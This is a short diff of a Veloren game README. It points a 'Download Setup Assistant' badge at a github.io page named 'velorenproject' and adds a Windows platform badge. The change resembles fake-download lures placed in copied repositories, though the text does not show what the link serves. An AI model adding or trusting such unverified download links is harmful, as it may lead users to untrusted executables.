@@ -1,6 +1,7 @@
 # Veloren
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://velorenproject.github.io/.github/)
+[![Platform](https://img.shields.io/badge/Platform-Windows-green)](#)
 
 ![Character Creation](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbn8AMYN3w2a8A3x66Fj4lxoYOglE8xHNeKw&s)  
 
